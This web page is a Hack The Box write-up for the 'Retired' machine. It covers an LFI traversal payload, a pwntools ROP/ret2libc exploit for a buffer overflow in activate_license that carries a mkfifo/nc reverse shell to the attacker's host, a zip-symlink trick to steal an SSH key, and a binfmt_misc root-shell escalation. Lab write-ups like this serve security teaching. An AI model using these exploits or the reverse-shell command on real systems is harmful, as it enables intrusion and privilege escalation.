<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retired Writeup (HTB)</title>
    <link rel="stylesheet" href="../../style/styles.css">
    <link rel="stylesheet" href="model.css"">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
    <main>
        <article class="article-container">
            <div class="article-header">
                <h1 class="article-title">Retired - HTB</h1>
                <div class="article-meta">
                    <span class="article-tags">
                        <i class="fas fa-tags"></i>
                        <span class="tag">Binary Exploitation</span>
                        <span class="tag">Web Application</span>
                        <span class="tag">Linux</span>
                        <span class="tag">HTB</span>
                    </span>
                    <span class="article-date"><i class="far fa-calendar"></i> 27 de Outubro, 2025</span>
                </div>
            </div>

            <div class="article-content">
                <h2>Introduction</h2>
                <p>
                    Difficulty: Medium<br>
                    Machine: Retired<br>
                    IP Address: 10.129.227.96
                </p>
                <p>We start the operation by running an nmap scan</p>
                
                <pre><code>PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkfdfWGso2b9nD1yYlcq35Rrc1OCqcabTsuKoIlCXMayYEXqqWVohwu+rXyX06gzGR4EYp/fvb1BUo7n819iCzKhFjf2W2RHWfBne9TpRShBtQJ95oQhM6djuEahYzOTWiO1wTYqMdZQwANin/HXPIu2i+KoeeeOPL6g0qE2e4pMKI+BDo4SteVObt3ssP5NLTmNOSqVqKoFnUTNNnyqlwcbO67tRVINku2Kc6LH/HV0XBGjVqMmwfz3MokaBmAqTpn2td6x7CKcPRfiRgIB5AqkePgqHZl8Wn+TdsG6gziPJ6+NVcvadMJ2ErsJLuchds0ZNToG3P879UTFUrF9Qn+Z0TiTN7X0FgbOGG6u7iaN/r4NP0t2qmp2rS+se+Q/j21T4jBFJOXxqjRWQvGfayIKic4Enkxwv5WvAd3uNm9R/WEIxf7Ol0eMK39fUdfElOTViPNOyW/vT6gA9DxcBZM/X1xPgC1XqNKs0mdA1cZY34BQVffDQ2carfW9JzBb8=
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKT7918Wsxx40zkqP9APcaPrC5DXZf5yJdrTvgykTvijs34VtZ+QnelzftO5kayBMgNgnOe1e6lj/VKK4l+38OU=
|   256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOvB+7fNvrbSjtwto1GCaTWqRasmSlmx+oz5dveP8m5/
80/tcp open  http    syn-ack ttl 63 nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
                <p>We found services running on ports 22 and 80</p>
                <img src="./assets/retired/retired1.png" alt="">
                <p>The web application showed a <code>page</code> parameter that reads local files, indicating a possible LFI</p>
                <img src="./assets/retired/retired2.png" alt="">
                <p>We used Feroxbuster to enumerate directories and found an interesting page with an upload option</p>
                <img src="./assets/retired/retired3.png" alt="">
                <p>When testing the upload, we noticed that the uploaded program is written to <code>activate_license.php</code>. Returning to the LFI, we were able to read the uploaded file, confirming that the vulnerability was exploitable.</p>
                <img src="./assets/retired/retired4.png" alt="">
                <p>We searched for more information inside the file until we located a binary called <code>activate_license</code> on the machine.</p>
                <img src="./assets/retired/retired5.png" alt="">
                <img src="./assets/retired/retired6.png" alt="">
                <p>We downloaded this binary and analyzed it with Ghidra.</p>
                <img src="./assets/retired/retired7.png" alt="">
                <p>In the analysis, we observed that the function <code>activate_license</code> has a buffer overflow.</p>
                <img src="./assets/retired/retired8.png" alt="">
                <p>The buffer is only 512 bytes long, and the function reading the data does not verify its size, allowing us to overwrite memory and inject a payload.</p>
                <p>We also noticed that to execute the binary, it needs to bind to a port, so we configured a simple mechanism for that before continuing our tests.</p>
                <img src="./assets/retired/retired9.png" alt="">
                <p>For local debugging, we disabled ASLR on our machine:</p>
                <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code>
                <p><br>We used gdb configured to follow the child process that executes the vulnerable function:</p>
                <pre><code>(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) run 1337</code></pre>
                <p>
                    With a generated pattern, we identified the RIP overwrite offset as 520 bytes. With this offset, we began constructing our payload.<br><br>
                    Since NX was enabled, we chose a ROP + ret2libc technique. As ASLR was active on the target, we needed to leak absolute addresses of the binary and loaded libraries. We went back to the LFI and retrieved the process PID.
                </p>
                <img src="./assets/retired/retired10.png" alt="">
                <p>The information in <code>/proc/PID/maps</code> was obtained via LFI, allowing us to map the base addresses of both the binary and libc. We also identified a writable section in the binary to write the command that would be executed.</p>
                <img src="./assets/retired/retired11.png" alt="">
                <p>The base address of <code>activate_license</code> is <code>0x5632aa9e5000</code> while libc is loaded at <code>0x7f7f49403000</code>. To get the offset of <code>system()</code> and look for ROP gadgets in libc, we needed to download it.</p>
                <pre><code>wget http://10.129.227.96/index.php?page=a.....///.....///.....///.....///.....///usr/lib/x86_64-linux-gnu/libc-2.31.so -O libc-2.31.so
--2025-08-19 21:54:47--  http://10.129.227.96/index.php?page=a.....///.....///.....///.....///.....///usr/lib/x86_64-linux-gnu/libc-2.31.so
Connecting to 10.129.227.96:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘libc-2.31.so’

libc-2.31.so          1.75M   213KB/s    in 10s          

2025-08-19 21:54:58 (172 KB/s) - ‘libc-2.31.so’ saved [1839792]</code></pre>
                <p>We used <code>objdump</code> to read the offset of <code>system()</code></p>
                <code>objdump -d libc-2.31.so | grep '^[0-9].*system'</code>
                <img src="./assets/retired/retired12.png" alt="">
                <p>We needed a few ROP gadgets to extract data from the stack and write our payload into writable memory. We found a <code>pop rdi</code> gadget in the <code>activate_license</code> binary</p>
                <code>ropper -f activate_license --search 'pop rdi; ret'</code>
                <img src="./assets/retired/retired13.png" alt="">
                <p>We also found some in libc</p>
                <img src="./assets/retired/retired14.png" alt="">
                <p>Next, we used <code>rabin2</code> to search for the offset of a writable section (e.g., data) in <code>activate_license</code></p>
                <code>rabin2 -S activate_license</code>
                <img src="./assets/retired/retired15.png" alt="">
                <p>With gadgets and offsets defined, we built the Python exploit using ROP techniques to write the command into writable memory and call system() with its pointer.</p>
                <pre><code>from sys import argv
from pwn import *
import requests

def perform_rce(rhost, lhost):
    actbase = 0x5632aa9e5000
    libcbase = 0x7f7f49403000

    pop_rdi = p64(actbase + 0x0000181b) #pop rdi; ret;
    pop_rdx = p64(libcbase + 0x0000cb1cd) #pop rdx; ret;
    mov = p64(libcbase + 0x00003ace5) # mov qword ptr [rdi], rdx; ret;

    offset = 520 # offset between buffer and saved RIP
    system = p64(libcbase + 0x000048e50) # libc system() address
    writable = actbase + 0x00004000

    # payload
    cmd = b"bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s 1337 >/tmp/f' \x00" % lhost.encode()
    rop = b''
    rop += b'A'*offset # junk
    for i in range(0, len(cmd), 8):
        rop += pop_rdi
        rop += p64(writable + i)
        rop += pop_rdx
        rop += cmd[i:i+8].ljust(8, b"\x00")
        rop += mov

    rop += pop_rdi
    rop += p64(writable)
    rop += system

    with open('getshell.key', 'wb') as f:
        f.write(rop)

    files = {"licensefile": ("getshell.key", open("getshell.key", "rb"), 'application/x-iwork-keynote-sffkey')}
    requests.post(f"http://{rhost}/activate_license.php", files=files)

perform_rce(argv[1], argv[2])</code></pre>
                <p>We sent the payload via upload to <code>activate_license.php</code> and obtained a shell on the target machine</p>
                <img src="./assets/retired/retired16.png" alt="">
                <p>While exploring the machine, we found a backup service running:</p>
                <img src="./assets/retired/retired17.png" alt="">
                <p>We read its content and identified that the backup script creates a zip archive of the web application directory and saves it in a world-readable location, removing old backups and keeping only the most recent ones.</p>
                <img src="./assets/retired/retired18.png" alt="">
                <p>And that binary contains the following content:</p>
                <img src="./assets/retired/retired19.png" alt="">
                <p>The script creates a zip archive of <code>/var/www/html</code> and writes it to a world-readable directory, then deletes old backups keeping only the last 10.<br></p>
                <p>The zip utility followed symbolic links by default, and the service was executed via systemd as user <code>dev</code>.<br></p>
                <p>We leveraged this to create a symbolic link from <code>/home/dev</code> pointing to <code>/var/www/html/dev</code></p>
                <br><code>ln -s /home/dev /var/www/html/dev</code>
                <p><br>We waited some time and then extracted the archive</p>
                <img src="./assets/retired/retired20.png" alt="">
                <p>That is, we linked, copied, and extracted. We grabbed the SSH private key and logged in as <code>dev</code>.<br></p>
                <p>Once logged in as <code>dev</code>, we noticed something interesting inside the <code>emuemu</code> folder</p>
                <img src="./assets/retired/retired21.png" alt="">
                <p>This program acts as a wrapper allowing writing to</p>
                <code>/proc/sys/fs/binfmt_misc/register</code>
                <p><br>The kernel's <code>binfmt_misc</code> support allows registering custom interpreters for specific file types using either magic bytes or extension-based recognition.</p>
                <p>In the Makefile of the project, we saw that <code>reg_helper</code> was installed in <code>/usr/lib/emuemu</code>, executable by the <code>dev</code> group, and had the capability required to allow writing to the <code>binfmt_misc</code> register, meaning anyone running it could write entries there.<br><br>Thus, <code>reg_helper</code> can be used to register a custom interpreter for OSTRICH ROM files.</p>
                <img src="./assets/retired/retired22.png" alt="">
                <p>With that capability, we planned to create a small program that sets UID and GID to zero and spawns a root shell. According to the <code>binfmt_misc</code> documentation:</p>
                <p>https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html</p>
                <p>The <code>binfmt_misc</code> register accepts strings in the following format, where flags are optional:</p>
                <br><code>:name:type:offset:magic:mask:interpreter:flags</code>
                <p><br>To take advantage of this, we can create a simple program that sets our UID and GID to zero and spawns a root shell, ignoring command-line arguments. This will act as our interpreter.</p>
                <pre><code>#include 
#include 
#include 
int main(void) { 
	setuid(0); 
	setgid(0); 
	system("/bin/bash"); 
}</code></pre>
                <p>We compile it: <code>gcc handler.c -o handler</code></p>
                <p>This program will act as the interpreter. Instead of replacing a default interpreter, we can also create a symbolic link with a custom extension and register a handler for that extension, using extension-based recognition mode:</p>
                <pre><code>type 
	is the type of recognition. Give M for magic and E for extension.</code></pre>
                <p>This is possible because <code>binfmt_misc</code> follows symbolic links. We can choose any SUID file as long as it’s not in use, instead of executing its handler, it just spawns a shell.</p>
                <br><code>ln -s /usr/bin/chfn chfn.TESTER</code>
                <p><br>To complete privilege escalation, we now need to send the proper registration string to <code>reg_helper</code> so that our handler is registered as the interpreter for the chosen extension.</p>
                <br><code>echo ":HTB:E::TESTER::$(realpath handler):C" | /usr/lib/emuemu/reg_helper</code>
                <p><br>With this, we successfully escalated privileges and obtained root access to the machine, completing the challenge.</p>
            </div>

            <div class="article-footer">
                <a href="../../index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to the start</a>
            </div>
        </article>
    </main>

    <footer>
        <div class="social-links">
            <a href="https://github.com/lsbxa" target="_blank"><i class="fab fa-github"></i></a>
            <a href="https://www.linkedin.com/in/marcelo-lisboa7/" target="_blank"><i class="fab fa-linkedin"></i></a>
        </div>
        <p>&copy; 2025 Memory Leak</p>
    </footer>
        <div id="imageModal" class="image-modal">
        <span class="image-modal-close">&times;</span>
        <img id="modalImage" src="" alt="">
    </div>

    <script>
        const modal = document.getElementById('imageModal');
        const modalImg = document.getElementById('modalImage');
        const closeBtn = document.querySelector('.image-modal-close');
        const images = document.querySelectorAll('.article-content img');

        images.forEach(img => {
            img.addEventListener('click', function() {
                modal.classList.add('active');
                modalImg.src = this.src;
            });
        });

        closeBtn.addEventListener('click', () => {
            modal.classList.remove('active');
        });

        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.classList.remove('active');
            }
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape' && modal.classList.contains('active')) {
                modal.classList.remove('active');
            }
        });
    </script>
</body>
</html>